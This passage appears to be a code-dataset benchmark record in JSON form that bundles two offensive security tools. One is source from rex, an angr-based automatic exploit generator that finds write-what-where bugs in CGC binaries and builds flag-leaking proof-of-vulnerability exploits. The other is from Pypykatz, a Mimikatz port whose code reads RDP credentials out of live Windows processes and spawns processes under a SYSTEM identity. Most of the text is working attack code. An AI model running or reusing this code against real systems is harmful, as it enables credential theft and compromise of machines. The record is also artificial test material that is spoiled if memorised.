angr.state_plugins.SimStatePlugin.__init__(self)\n\n\n        self.writes = []\n        self.data_loc = 0x10000\n        self.reads = []\n        self.mem_ranges = []\n        self.addresses_written = set()\n        self.addrs_to_attack = []\n        self.read_replacements = dict()\n        self.read_constraints = []\n\n    def assign_write(self, addr, data, state):\n        l.debug(\"assigning write\")\n\n\n        for mem_range in self.mem_ranges:\n\n            two_nums = state.solver.eval_upto(mem_range.start_addr - addr, 2)\n            if len(two_nums) == 1:\n                l.debug(\"found a matching range for var write\")\n                offset = two_nums[0]\n                assigned = mem_range.assigned_start-offset\n\n\n                min_addr = (mem_range.min_start-offset) & 0xffffffff\n                max_addr = (mem_range.max_start-offset) & 0xffffffff\n\n                mem_range.all_addr_keys.add(addr.cache_key)\n                mem_range.offset_to_data[offset] = data\n                self.writes.append(WriteInfo(addr, data, min_addr, max_addr, assigned, mem_range))\n                return assigned\n\n\n        min_addr = state.solver.min(addr)\n        max_addr = state.solver.max(addr)\n        l.debug(\"new write with min: %\n\n\n        assigned = self.data_loc\n        mem_range = MemRange(addr, assigned)\n        mem_range.min_start = min_addr\n        mem_range.max_start = max_addr\n        mem_range.offset_to_data[0] = data\n        self.mem_ranges.append(mem_range)\n        l.debug(\"assigned range %\n        self.data_loc += 0x10000\n        self.writes.append(WriteInfo(addr, data, min_addr, max_addr, assigned, mem_range))\n\n\n        self.addresses_written = set(x for x in self.addresses_written if x < min_addr or x > max_addr)\n\n        return assigned\n\n\n    def assign_read(self, addr, data, state):\n        l.debug(\"assigning read\")\n\n\n        for mem_range in self.mem_ranges:\n\n            two_nums = state.solver.eval_upto(mem_range.start_addr - addr, 2)\n            if len(two_nums) == 1:\n                l.debug(\"found a matching range for var read\")\n                offset = two_nums[0]\n                assigned = mem_range.assigned_start-offset\n\n\n                min_addr = (mem_range.min_start-offset) & 0xffffffff\n                max_addr = (mem_range.max_start-offset) & 0xffffffff\n\n                mem_range.all_addr_keys.add(addr.cache_key)\n                self.reads.append(ReadInfo(addr, data, min_addr, max_addr, assigned, mem_range))\n                return assigned\n\n\n        min_addr = state.solver.min(addr)\n        max_addr = state.solver.max(addr)\n        l.debug(\"new read with min: %\n\n\n        assigned = self.data_loc\n        mem_range = MemRange(addr, assigned)\n        mem_range.min_start = min_addr\n        mem_range.max_start = max_addr\n        self.mem_ranges.append(mem_range)\n        l.debug(\"assigned range %\n        self.data_loc += 0x10000\n        self.reads.append(ReadInfo(addr, data, min_addr, max_addr, assigned, mem_range))\n\n\n        self.addresses_written = set(x for x in self.addresses_written if x < min_addr or x > max_addr)\n\n        return assigned\n\n    @angr.state_plugins.SimStatePlugin.memo\n    def copy(self, memo):\n        s = SimAddressTracker()\n        s.writes = list(self.writes)\n        s.reads = list(self.reads)\n        s.mem_ranges = list(self.mem_ranges)\n        s.addresses_written = set(self.addresses_written)\n        s.addrs_to_attack = list(self.addrs_to_attack)\n        s.read_replacements = dict(self.read_replacements)\n        s.read_constraints = list(self.read_constraints)\n        return s\n\n\nclass ExploreForExploit(Technique):\n\n    name = \"explore_for_exploit\"\n\n    applicable_to = ['cgc']\n\n    cgc_registers = [\"eax\", \"ecx\", \"edx\", \"ebx\", \"esp\", \"ebp\", \"esi\", \"edi\"]\n\n    FLAG_PAGE = 0x4347c000\n\n    bitmask_threshold = 20\n\n    generates_pov = True\n\n\n    pov_type = None\n\n    def __init__(self, crash, rop, shellcode):\n        super(ExploreForExploit, self).__init__(crash, rop, shellcode)\n\n    @staticmethod\n    def _get_writable_pages(state):\n        last_addr = -1\n        curr_start = -1\n        ranges = []\n        for page_num, page in sorted(state.memory._pages.items(), key=lambda x:x[0]):\n            if not state.solver.eval(page.permissions) & 0x2:\n                continue\n            page_addr = page_num*0x1000\n            if page_addr != last_addr:\n                if last_addr != -1:\n                    ranges.append((curr_start, last_addr))\n                curr_start = page_addr\n            last_addr = page_addr + 0x1000\n        if last_addr != -1:\n            ranges.append((curr_start, last_addr))\n        return ranges\n\n\n    @staticmethod\n    def is_writable_and_mapped(addr, state):\n        try:\n            permissions = state.solver.eval(state.memory.permissions(addr))\n            return (permissions & 2) != 0\n        except KeyError:\n            return False\n        except angr.SimMemoryError:\n            return False\n\n    @staticmethod\n    def mem_write_hook(state):\n        addr = state.inspect.mem_write_address\n\n        expr = state.inspect.mem_write_expr\n\n        if any(v.startswith(\"sim_mem\") for v in addr.variables):\n            l.warning(\"Found possible arbitrary write. To be implemented.\")\n\n\n\n        two_addrs = state.solver.eval_upto(addr, 2)\n        if len(two_addrs) == 0:\n            l.warning(\"no solutions while trying to get 2 addrs\")\n            return\n        if not state.solver.symbolic(addr) or len(two_addrs) == 1:\n            state.get_plugin(\"address_tracker\").addresses_written.add(two_addrs[0])\n            return\n\n\n\n        converted = state.get_plugin(\"address_tracker\").assign_write(addr, expr, state)\n        state.inspect.mem_write_address = converted\n\n    @staticmethod\n    def exit_hook(state):\n        exit_target = state.inspect.exit_target\n        if any(v.startswith(\"sim_mem\") for v in exit_target.variables):\n            l.debug(\"found possible target to overwrite at ip %\n            for v in exit_target.variables:\n                if v.startswith(\"sim_mem\"):\n                    addr = int(v.replace(\"sim_mem_\", \"\").split(\"_\")[0], 16)\n                    a_addr = AttackAddr(addr)\n                    state.get_plugin(\"address_tracker\").addrs_to_attack.append(a_addr)\n                    break\n\n    @staticmethod\n    def syscall_hook(state):\n        syscall_name = state.inspect.syscall_name\n        if syscall_name == \"transmit\":\n\n\n            buf = state.regs.ecx\n            fd = state.solver.eval(state.regs.ebx)\n            if fd != 0 and fd != 1:\n                l.warning(\"weird fd value: %d\", fd)\n                return\n            for v in buf.variables:\n                if v.startswith(\"sim_mem\"):\n                    addr = int(v.replace(\"sim_mem_\", \"\").split(\"_\")[0], 16)\n                    a_addr = AttackAddr(addr,\n                                        goal_start=ExploreForExploit.FLAG_PAGE,\n                                        goal_end=ExploreForExploit.FLAG_PAGE+0x500)\n                    state.get_plugin(\"address_tracker\").addrs_to_attack.append(a_addr)\n                    l.debug(\"found possible addr to attack to leak: %\n                    break\n\n\n\n    def mem_read_hook_after(self, state):\n        addr = state.inspect.mem_read_address\n        data = state.inspect.mem_read_expr\n        concrete_addr = state.solver.eval(addr)\n        writable = self.is_writable_and_mapped(concrete_addr, state)\n\n\n\n        if writable and concrete_addr not in state.get_plugin(\"address_tracker\").addresses_written and \\\n                len(state.get_plugin(\"address_tracker\").writes) > 0 and \\\n                any(write.min_addr <= concrete_addr <= write.max_addr\n                    for write in state.get_plugin(\"address_tracker\").writes):\n\n            replacement = state.solver.BVS(\"sim_mem_\" + hex(concrete_addr).replace(\"L\",\"\"), len(data))\n            state.inspect.mem_read_expr = replacement\n\n            state.add_constraints(replacement == data)\n\n            state.get_plugin(\"address_tracker\").read_constraints.append(replacement == data)\n            state.get_plugin(\"address_tracker\").read_replacements[replacement.cache_key] = data\n\n    @staticmethod\n    def addr_analyze(addr, state):\n        if not state.solver.symbolic(addr):\n            return addr\n\n        min_addr = state.solver.min(addr)\n        max_addr = state.solver.max(addr)\n        if min_addr == max_addr:\n            return addr\n        return addr\n\n    def which_bytes_2(self, out_data):\n        byte_map = dict()\n        for i, byte in enumerate(out_data.chop(8)):\n\n\n            if len(byte.variables) == 1 and byte.op == \"BVS\":\n                byte_index = int(list(byte.variables)[0].split(\"_\")[0].split(\"-\")[-1])\n                byte_map[i] = byte_index\n        curr = -1\n        best_length = 0\n        best_start = -1\n        prev = -1\n\n        for i in range(out_data.size()//8 + 1):\n            if i in byte_map and (prev == -1 or byte_map[i]-1 == prev):\n                if curr == -1:\n                    curr = i\n                prev = byte_map[i]\n            else:\n                if curr != -1:\n                    length = i - curr\n                    if length > best_length:\n                        best_start = curr\n                        best_length = length\n                curr = -1\n                prev = -1\n\n        if best_start == -1:\n            return None\n        return best_start\n\n    def attack(self, path, write_addrs, initial_state):\n\n\n        l.debug(\"attacking path %s at addrs %s\", path, [hex(x.addr) for x in write_addrs])\n        addrs = path.history.bbl_addrs.hardcopy\n        initial_state = initial_state.copy()\n        addr_tracker = path.get_plugin(\"address_tracker\").copy()\n\n\n\n\n        for c in addr_tracker.read_constraints:\n            initial_state.add_constraints(c)\n\n\n\n\n\n\n\n\n        exploit_type = 0\n        for write_addr in write_addrs:\n            found = False\n            for write in list(addr_tracker.writes):\n                if write.min_addr <= write_addr.addr <= write.max_addr:\n                    l.debug(\"trying to satisfy write\")\n                    if initial_state.solver.satisfiable(extra_constraints=(write.addr == write_addr.addr,)):\n                        if write_addr.goal_start is None:\n                            l.debug(\"found a satisfiable write for addr %\n                            initial_state.add_constraints(write.addr == write_addr.addr)\n                            found = True\n                            exploit_type = 1\n                        else:\n                            constraints = list()\n\n                            constraints.append(write.addr == write_addr.addr)\n                            constraints.append(write.data >= write_addr.goal_start)\n                            constraints.append(write.data <= write_addr.goal_end)\n                            if initial_state.solver.satisfiable(extra_constraints=constraints):\n                                found = True\n                                initial_state.add_constraints(*constraints)\n                                initial_state.add_constraints(write.data == initial_state.solver.eval(write.data))\n                                exploit_type = 2\n                        if found:\n\n                            addr_tracker.writes = [a for a in addr_tracker.writes if a.mem_range != write.mem_range]\n                            addr_tracker.reads = [a for a in addr_tracker.reads if a.mem_range != write.mem_range]\n                            found = True\n                            break\n            if not found:\n                l.warning(\"couldn't write to addr %\n                return None\n\n        if exploit_type == 0:\n            exploit_type = 1\n\n\n        l.debug(\"%d writes remaining\", len(addr_tracker.writes))\n        l.debug(\"%d reads remaining\", len(addr_tracker.reads))\n\n\n\n        remaining = addr_tracker.writes + addr_tracker.reads\n\n        writable_ranges = self._get_writable_pages(initial_state)\n        for addr in remaining:\n            constraint = initial_state.solver.Or(*(initial_state.solver.And(r[0] <= addr.addr, addr.addr < r[1]) for r in writable_ranges))\n            initial_state.add_constraints(constraint)\n\n        if not initial_state.solver.satisfiable():\n            return None\n\n        l.debug(\"Running batch eval\")\n        try:\n            solns = initial_state.solver._solver.batch_eval(tuple(addr.addr for addr in remaining), 1)\n        except claripy.UnsatError:\n            return None\n\n        if len(solns) == 0:\n            l.warning(\"couldn't point them all at writable locations :(\")\n            return None\n\n\n        soln = solns[0]\n        for concrete, addr in zip(soln, remaining):\n            initial_state.add_constraints(concrete == addr.addr)\n\n\n\n        last_checked = 0\n        initial_state.options.discard(angr.options.UNICORN)\n\n        def check_path(state):\n            suffix = state.history.recent_bbl_addrs\n            return suffix != addrs[last_checked:last_checked+len(suffix)]\n\n        pg = self.crash.project.factory.simulation_manager(initial_state, save_unconstrained=True)\n        prev = None\n\n        while len(pg.active) > 0 and len(pg.one_active.history.bbl_addrs.hardcopy) < len(addrs):\n            l.debug(\"light-tracing: %s\", pg.active)\n            pg.move('active', 'missed', check_path)\n            if len(pg.active) == 0:\n                l.warning(\"WTF misfollow error\")\n                return None\n\n            prev = pg.active[0]\n            last_checked += len(prev.history.recent_bbl_addrs)\n            pg.step()\n\n\n        if len(pg.unconstrained) == 0 and exploit_type == 1:\n\n            l.warning(\"attack failed, simgr: %s\", pg)\n            return None\n        elif exploit_type == 2:\n\n            pg.step()\n            pg.prune()\n            if len(pg.active) == 0:\n                l.warning(\"Error: no paths made it\")\n                return None\n            stdout_len = pg.active[0].posix.fd[1].write_pos\n            out_data = pg.active[0].posix.fd[1].write_storage.load(0, stdout_len)\n\n            if not any(v.startswith(\"cgc-flag\") for v in out_data.variables):\n                l.warning(\"Error: flag data not in stdout\")\n                return None\n\n\n            start = self.which_bytes_2(out_data)\n            if start is None:\n                return None\n            l.debug(\"making crash object\")\n            crash_state = pg.active[0]\n            crash = rex.crash.Crash(self.crash.target, crash=self.crash.crash_input, pov_file=self.crash.pov_file,\n                                    crash_state=crash_state, prev_state=prev, rop_cache_path=self.crash._rop_cache_path)\n            exploit = rex.exploit.cgc.type2.cgc_type2_general.CGCType2GeneralExploit(\n                    method_name='exploration', crash=crash, input_str=crash_state.posix.dumps(0),\n                    output_index=start, bypasses_nx=True, bypasses_aslr=False)\n            self.pov_type = 2\n            return exploit\n\n        crash_state = pg.unconstrained[0]\n\n        crash_state.globals[\"DONT_EXPLORE\"] = True\n        l.debug(\"making crash object\")\n        crash = rex.crash.Crash(self.crash.target, crash=self.crash.crash_input, pov_file=self.crash.pov_file,\n                                crash_state=crash_state, prev_state=prev, rop_cache_path=self.crash._rop_cache_path)\n        try:\n            exploit_factory = crash.exploit()\n            if exploit_factory.best_type1 is not None:\n                self.pov_type = 1\n                return exploit_factory.best_type1\n            if exploit_factory.best_type2 is not None:\n                self.pov_type = 2\n                return exploit_factory.best_type2\n        except CannotExploit as e:\n            l.warning(\"could not exploit: %s\", e)\n\n        l.debug(\"didn't succeed\")\n        return None\n\n    def check(self):\n        if not self.crash.one_of(Vulnerability.WRITE_WHAT_WHERE):\n            self.check_fail_reason(\"Can only apply explore for exploit technique to ip overwrite vulnerabilities.\")\n            return False\n\n        if \"DONT_EXPLORE\" in self.crash.state.globals:\n            self.check_fail_reason(\"Already explored this crash.\")\n            return False\n\n        return True\n\n    def apply(self, **kwargs):\n\n\n\n\n\n        initial_state = self.crash._t.predecessors[-2].copy()\n        initial_state.history.trim()\n\n\n        initial_state.preconstrainer.remove_preconstraints()\n\n\n\n        new_constraints = [c for c in initial_state.solver.constraints\n            if not (c.op == '__eq__' and c.args[0].op == 'BVS' and not c.args[1].symbolic and\n                len(c.variables) == 1 and next(iter(c.variables)).startswith('cgc-flag'))\n            and not (c.op == '__eq__' and c.args[1].op == 'BVS' and not c.args[0].symbolic and\n                len(c.variables) == 1 and next(iter(c.variables)).startswith('cgc-flag'))\n        ]\n\n        initial_state.release_plugin('solver')\n        initial_state.add_constraints(*new_constraints)\n        l.debug(\"downsizing unpreconstrained state\")\n        initial_state.downsize()\n        l.debug(\"simplifying solver\")\n        initial_state.solver.simplify()\n        l.debug(\"simplification done\")\n        initial_state.solver._solver.result = None\n\n\n        start_state = initial_state.copy()\n        start_state.release_plugin(\"zen_plugin\")\n        start_state.release_plugin(\"chall_resp_info\")\n        start_state.options.discard(angr.options.CGC_ZERO_FILL_UNCONSTRAINED_MEMORY)\n        start_state.options.add(angr.options.TRACK_JMP_ACTIONS)\n\n\n\n\n\n\n        start_state.inspect.b(\n            'mem_write',\n            angr.BP_BEFORE,\n            action=self.mem_write_hook\n        )\n\n        start_state.inspect.b(\n            'mem_read',\n            angr.BP_AFTER,\n                action=self.mem_read_hook_after\n        )\n\n        start_state.inspect.b(\n            'exit',\n            angr.BP_BEFORE,\n            action=self.exit_hook\n        )\n\n        start_state.inspect.b(\n            'syscall',\n            angr.BP_BEFORE,\n            action=self.syscall_hook\n        )\n\n\n        start_state.memory._default_read_strategy = [\"any\"]\n        start_state.memory._default_write_strategy = [\"any\"]\n\n\n\n        try:\n            start_state.options.discard(angr.options.UNICORN)\n        except AttributeError:\n            pass\n\n\n        start_state.options.discard(angr.options.LAZY_SOLVES)\n\n\n        start_state.register_plugin(\"address_tracker\", SimAddressTracker())\n\n\n        start_state.solver._solver.timeout = 15000\n\n        pg = self.crash.project.factory.simulation_manager(start_state, save_unconstrained=True)\n        step_num = 0\n        while len(pg.active) > 0:\n            pg.step()\n            step_num += 1\n            if step_num % 10 == 0:\n                l.debug(\"stepping %s\", pg)\n\n            for x in pg.active + pg.deadended + pg.unconstrained + pg.errored:\n                for addr in x.get_plugin(\"address_tracker\").addrs_to_attack:\n                    exploit = self.attack(x, [addr], initial_state.copy())\n                    if exploit is not None:\n                        return exploit\n\n                x.get_plugin(\"address_tracker\").addrs_to_attack = []\n            for x in pg.unconstrained:\n\n\n\n                exploit = self.attack(x, [], initial_state.copy())\n                if exploit is not None:\n                    return exploit\n            for x in pg.errored:\n                l.warning(\"errored path: %s\", x.error)\n            pg.drop(stash=\"unconstrained\")\n            pg.drop(stash=\"deadended\")\n            del pg.errored[:]\n\n        l.warning(\"out of paths!\")\n\n\n\n\n\n\n'rex/rex/__init__.py'\n:from rex.vulnerability import Vulnerability\nfrom rex.crash import Crash, NonCrashingInput\nfrom rex.exploit import Exploit, CannotExploit, CannotExplore\nfrom rex.scripter import Scripter\n",
        "gt": [
            "'rex/rex/vulnerability.py'",
            "'rex/rex/__init__.py'",
            "'rex/rex/exploit/techniques/explore_for_exploit.py'",
            "'rex/rex/exploit/techniques/__init__.py'"
        ]
    },
    {
        "files": [
            "'Pypykatz/pypykatz/rdp/cmdhelper.py'",
            "'Pypykatz/pypykatz/__main__.py'",
            "'Pypykatz/pypykatz/rdp/parser.py'",
            "'Pypykatz/pypykatz/rdp/packages/creds/decryptor.py'"
        ],
        "content": "'Pypykatz/pypykatz/rdp/cmdhelper.py'\n:\n\n\n\n\n\nfrom pypykatz.rdp.parser import RDPCredParser\n\n\n\nclass RDPCMDHelper:\n\tdef __init__(self):\n\t\tself.live_keywords = ['rdp']\n\t\tself.keywords = ['rdp']\n\n\tdef add_args(self, parser, live_parser):\n\n\t\tlive_group = live_parser.add_parser('rdp', help='a')\n\t\tlive_rdp_subparsers = live_group.add_subparsers()\n\t\tlive_rdp_subparsers.required = True\n\t\tlive_rdp_subparsers.dest = 'live_rdp_module'\n\n\t\tlive_logonpasswords_group = live_rdp_subparsers.add_parser('logonpasswords', help='Parse RDP credentials (SERVER side)')\n\t\tlive_logonpasswords_group.add_argument('--pid', type=int, help = 'Search a specific process PID for RDP creds')\n\t\tlive_logonpasswords_group.add_argument('--all', action='store_true', help = 'Looks for all processes which use the rdp DLL rdpcorets.dll')\n\n\t\tlive_mstsc_group = live_rdp_subparsers.add_parser('mstsc', help='Parse RDP credentials (CLIENT side)')\n\t\tlive_mstsc_group.add_argument('--pid', type=int, help = 'Search a specific process PID for RDP creds')\n\t\tlive_mstsc_group.add_argument('--all', action='store_true', help = 'Looks for all processes which use the rdp DLL mstscax.dll')\n\n\n\t\tgroup = parser.add_parser('rdp', help='Parse RDP credentials from minidump file')\n\t\trdp_subparsers = group.add_subparsers()\n\t\trdp_subparsers.required = True\n\t\trdp_subparsers.dest = 'rdp_module'\n\n\t\tlogonpasswords_group = rdp_subparsers.add_parser('logonpasswords', help='Parse RDP credentials (SERVER side) from minidump file. Plain-text passwords only for WINVER <= Win2012')\n\t\tlogonpasswords_group.add_argument('cmd', choices=['minidump'])\n\t\tlogonpasswords_group.add_argument('memoryfile', help='path to the dump file')\n\n\t\tmstsc_group = rdp_subparsers.add_parser('mstsc', help='Parse RDP credentials (CLIENT side) from minidump file. Unable to recover plain-text passwords offline.')\n\t\tmstsc_group.add_argument('cmd', choices=['minidump'])\n\t\tmstsc_group.add_argument('memoryfile', help='path to the dump file')\n\n\tdef execute(self, args):\n\t\tif len(self.keywords) > 0 and args.command in self.keywords:\n\t\t\tself.run(args)\n\n\t\tif len(self.live_keywords) > 0 and args.command == 'live' and args.module in self.live_keywords:\n\t\t\tself.run_live(args)\n\n\tdef run_live(self, args):\n\t\tcredparsers = RDPCredParser.go_live(pid = args.pid, all_rdp = args.all, live_rdp_module = args.live_rdp_module)\n\t\tfor credparser in credparsers:\n\t\t\tfor cred in credparser.credentials:\n\t\t\t\tprint(str(cred))\n\n\tdef run(self, args):\n\t\tcredparsers = RDPCredParser.parse_minidump_file(args.memoryfile, args.rdp_module)\n\t\tfor credparser in credparsers:\n\t\t\tfor cred in credparser.credentials:\n\t\t\t\tprint(str(cred))\n'Pypykatz/pypykatz/__main__.py'\n:\n\n\n\n\n\nimport os\nimport logging\n\ndef main():\n\timport argparse\n\timport glob\n\n\tfrom pypykatz import logger\n\tfrom pypykatz.utils.crypto.cmdhelper import CryptoCMDHelper\n\tfrom pypykatz.ldap.cmdhelper import LDAPCMDHelper\n\tfrom pypykatz.kerberos.cmdhelper import KerberosCMDHelper\n\tfrom pypykatz.lsadecryptor.cmdhelper import LSACMDHelper\n\tfrom pypykatz.registry.cmdhelper import RegistryCMDHelper\n\tfrom pypykatz.remote.cmdhelper import RemoteCMDHelper\n\tfrom pypykatz.dpapi.cmdhelper import DPAPICMDHelper\n\tfrom pypykatz.rdp.cmdhelper import RDPCMDHelper\n\tfrom pypykatz.parsers.cmdhelper import ParsersCMDHelper\n\n\tcmdhelpers = [LSACMDHelper(), RegistryCMDHelper(), CryptoCMDHelper(), KerberosCMDHelper(), RemoteCMDHelper(), DPAPICMDHelper(), LDAPCMDHelper(), RDPCMDHelper(), ParsersCMDHelper()]\n\n\ttry:\n\t\tfrom pypykatz.smb.cmdhelper import SMBCMDHelper\n\t\tcmdhelpers.append(SMBCMDHelper())\n\texcept Exception as e:\n\t\tprint(e)\n\t\tpass\n\n\tparser = argparse.ArgumentParser(description='Pure Python implementation of Mimikatz --and more--')\n\tparser.add_argument('-v', '--verbose', action='count', default=0)\n\n\tsubparsers = parser.add_subparsers(help = 'commands')\n\tsubparsers.required = True\n\tsubparsers.dest = 'command'\n\n\tlive_group = subparsers.add_parser('live', help='Get secrets from live machine')\n\tlive_subparsers = live_group.add_subparsers()\n\tlive_subparsers.required = True\n\tlive_subparsers.dest = 'module'\n\n\n\tfor helper in cmdhelpers:\n\t\thelper.add_args(subparsers, live_subparsers)\n\n\n\tlive_subparser_process_group = live_subparsers.add_parser('process', help='Process creating/manipulation commands')\n\n\tlive_subparser_process_group.add_argument('cmd', choices=['create'])\n\tlive_subparser_process_group.add_argument('-i','--interactive', action = 'store_true', help = 'Spawns a new interactive process')\n\tlive_subparser_process_group.add_argument('--sid', help = 'Impersonate given SID in new process')\n\tlive_subparser_process_group.add_argument('-c', '--cmdline', help = 'The process to execute. Default: cmd.exe')\n\n\tlive_subparser_token_group = live_subparsers.add_parser('token', help='Token creating/manipulation commands')\n\tlive_subparser_token_group.add_argument('cmd', choices=['list', 'current'])\n\tlive_subparser_token_group.add_argument('-f','--force', action='store_true', help= 'Tries to list as many tokens as possible without SE_DEBUG privilege')\n\tlive_subparser_users_group = live_subparsers.add_parser('users', help='User creating/manipulation commands')\n\tlive_subparser_users_group.add_argument('cmd', choices=['list','whoami'])\n\n\tversion_group = subparsers.add_parser('version', help='version')\n\tbanner_group = subparsers.add_parser('banner', help='banner')\n\tlogo_group = subparsers.add_parser('logo', help='logo')\n\n\n\n\targs = parser.parse_args()\n\n\n\tif args.verbose == 0:\n\t\tlogging.basicConfig(level=logging.INFO)\n\t\tlogger.setLevel(logging.INFO)\n\telif args.verbose == 1:\n\t\tlogging.basicConfig(level=logging.DEBUG)\n\t\tlogger.setLevel(logging.DEBUG)\n\telse:\n\t\tlevel = 5 - args.verbose\n\t\tlogging.basicConfig(level=level)\n\t\tlogger.setLevel(1)\n\n\n\n\n\n\tfor helper in cmdhelpers:\n\t\thelper.execute(args)\n\n\n\n\tif args.command == 'live':\n\t\tif args.module == 'process':\n\t\t\tif args.cmd == 'create':\n\t\t\t\tfrom pypykatz.commons.winapi.processmanipulator import ProcessManipulator\n\t\t\t\tpm = ProcessManipulator()\n\t\t\t\tsid = 'S-1-5-18'\n\t\t\t\tif args.sid is not None:\n\t\t\t\t\tsid = args.sid\n\n\t\t\t\tif args.cmdline is not None:\n\t\t\t\t\tcmdline = args.cmdline\n\t\t\t\telse:\n\n\t\t\t\t\tcmdline = os.environ['ComSpec']\n\n\t\t\t\tpm.create_process_for_sid(target_sid = sid, cmdline = cmdline, interactive = args.interactive)\n\t\t\t\treturn\n\n\t\telif args.module == 'token':\n\t\t\tfrom pypykatz.commons.winapi.processmanipulator import ProcessManipulator\n\t\t\tif args.cmd == 'list':\n\t\t\t\tpm = ProcessManipulator()\n\t\t\t\tfor ti in pm.list_all_tokens(args.force):\n\t\t\t\t\tprint(str(ti))\n\t\t\t\treturn\n\n\t\t\tif args.cmd == 'current':\n\t\t\t\tpm = ProcessManipulator()\n\t\t\t\ttoken_info = pm.get_current_token_info()\n\t\t\t\tprint(str(token_info))\n\t\t\t\treturn\n\n\t\telif args.module == 'users':\n\t\t\tfrom pypykatz.commons.winapi.machine import LiveMachine\n\n\t\t\tif args.cmd == 'list':\n\t\t\t\tlm = LiveMachine()\n\t\t\t\tusers = lm.list_users()\n\t\t\t\tfor sid in users:\n\t\t\t\t\tprint(str(users[sid]))\n\n\t\t\telif args.cmd == 'whoami':\n\t\t\t\tlm = LiveMachine()\n\t\t\t\tuser = lm.get_current_user()\n\t\t\t\tprint(str(user))\n\n\telif args.command == 'version':\n\t\tfrom pypykatz._version import __version__\n\t\tprint(__version__)\n\n\telif args.command == 'banner':\n\t\tfrom pypykatz._version import __banner__\n\t\tprint(__banner__)\n\n\telif args.command == 'logo':\n\t\tfrom pypykatz._version import __logo__, __logo_color__\n\t\tprint(__logo_color__)\n\t\tprint(__logo__)\n\n\n\n\nif __name__ == '__main__':\n\tmain()\n\n'Pypykatz/pypykatz/rdp/parser.py'\n:\nimport platform\nfrom pypykatz import logger\nfrom minidump.minidumpfile import MinidumpFile\nfrom pypykatz.commons.common import KatzSystemInfo\nfrom pypykatz.rdp.packages.creds.templates import RDPCredsTemplate\nfrom pypykatz.rdp.packages.creds.decryptor import RDPCredentialDecryptorLogonpasswords, RDPCredentialDecryptorMstsc\n\nclass RDPCredParser:\n\tdef __init__(self, process, reader, sysinfo, rdp_module, find_first=False, lower_bound=0, upper_bound=-1):\n\t\tself.process = process\n\t\tself.reader = reader\n\t\tself.sysinfo = sysinfo\n\t\tself.credentials = []\n\t\tself.rdp_module = rdp_module\n\t\tself.find_first = find_first\n\t\tself.lower_bound = lower_bound\n\t\tself.upper_bound = upper_bound\n\n\t@staticmethod\n\tdef go_live(pid = None, all_rdp = False, live_rdp_module = None):\n\t\tif platform.system() != 'Windows':\n\t\t\traise Exception('Live parsing will only work on Windows')\n\t\tfrom pypykatz.commons.readers.local.common.live_reader_ctypes import OpenProcess, PROCESS_ALL_ACCESS\n\t\tfrom pypykatz.commons.winapi.machine import LiveMachine\n\t\tfrom pypykatz.commons.winapi.constants import PROCESS_VM_READ , PROCESS_VM_WRITE , PROCESS_VM_OPERATION , PROCESS_QUERY_INFORMATION , PROCESS_CREATE_THREAD\n\t\tfrom pypykatz.commons.readers.local.common.privileges import enable_debug_privilege\n\t\tfrom pypykatz.commons.readers.local.live_reader import LiveReader\n\t\tfrom pypykatz.commons.readers.local.process import Process\n\t\treq_access_rights = PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD\n\n\t\tenable_debug_privilege()\n\t\ttargets = []\n\n\t\tif pid is not None:\n\t\t\tprocess = Process(pid=pid, access = req_access_rights )\n\t\t\tprocess.list_modules()\n\t\t\treader = LiveReader(process_handle=process.phandle)\n\t\t\tsysinfo = KatzSystemInfo.from_live_reader(reader)\n\t\t\ttargets.append(RDPCredParser(process, reader.get_buffered_reader(), sysinfo, live_rdp_module))\n\n\t\telse:\n\t\t\tmachine = LiveMachine()\n\n\t\t\tif live_rdp_module == \"logonpasswords\" and all_rdp is False:\n\t\t\t\tfor service_name, display_name, pid in machine.list_services():\n\t\t\t\t\tif service_name == 'TermService':\n\t\t\t\t\t\tprocess = Process(pid=pid, access = req_access_rights )\n\t\t\t\t\t\treader = LiveReader(process_handle=process.phandle)\n\t\t\t\t\t\tsysinfo = KatzSystemInfo.from_live_reader(reader)\n\t\t\t\t\t\ttargets.append(RDPCredParser(process, reader.get_buffered_reader(), sysinfo, live_rdp_module))\n\n\t\t\tif live_rdp_module == \"mstsc\" and all_rdp is False:\n\t\t\t\tfor pid in machine.list_all_pids():\n\t\t\t\t\ttry:\n\t\t\t\t\t\tprocess = Process(pid=pid, access = req_access_rights )\n\t\t\t\t\t\tfor module in process.list_modules():\n\t\t\t\t\t\t\tif module.name.lower().find(\"mstscax.dll\") != -1:\n\t\t\t\t\t\t\t\treader = LiveReader(process_handle=process.phandle)\n\t\t\t\t\t\t\t\tsysinfo = KatzSystemInfo.from_live_reader(reader)\n\t\t\t\t\t\t\t\ttargets.append(RDPCredParser(process, reader.get_buffered_reader(), sysinfo, live_rdp_module))\n\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\texcept Exception as e:\n\n\n\t\t\t\t\t\tpass\n\t\t\t\t\tif len(targets):\n\t\t\t\t\t\tbreak\n\n\t\t\tif all_rdp is True:\n\t\t\t\tfor pid in machine.list_all_pids():\n\t\t\t\t\ttry:\n\t\t\t\t\t\tprocess = Process(pid=pid, access = req_access_rights )\n\t\t\t\t\t\tfor module in process.list_modules():\n\t\t\t\t\t\t\tif module.name.lower().find(\"mstscax.dll\") != -1 or module.name.lower().find(\"rdpcorets.dll\") != -1:\n\t\t\t\t\t\t\t\treader = LiveReader(process_handle=process.phandle)\n\t\t\t\t\t\t\t\tsysinfo = KatzSystemInfo.from_live_reader(reader)\n\t\t\t\t\t\t\t\ttargets.append(RDPCredParser(process, reader.get_buffered_reader(), sysinfo, live_rdp_module))\n\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\texcept Exception as e:\n\n\n\t\t\t\t\t\tprint(e)\n\n\t\tfor target in targets:\n\t\t\ttarget.start()\n\t\treturn targets\n\n\t@staticmethod\n\tdef parse_minidump_file(filename, rdp_module, chunksize = 10*1024):\n\t\ttry:\n\t\t\tminidump = MinidumpFile.parse(filename)\n\t\t\treader = minidump.get_reader().get_buffered_reader(segment_chunk_size=chunksize)\n\t\t\tsysinfo = KatzSystemInfo.from_minidump(minidump)\n\t\texcept Exception as e:\n\t\t\tlogger.exception('Minidump parsing error!')\n\t\t\traise e\n\t\ttry:\n\t\t\tmimi = RDPCredParser(None, reader, sysinfo, rdp_module)\n\t\t\tmimi.start()\n\t\texcept Exception as e:\n\t\t\tlogger.info('Credentials parsing error!')\n\t\t\traise e\n\t\treturn [mimi]\n\n\tdef rdpcreds(self):\n\t\tif self.rdp_module == \"logonpasswords\":\n\t\t\tdecryptor_template = 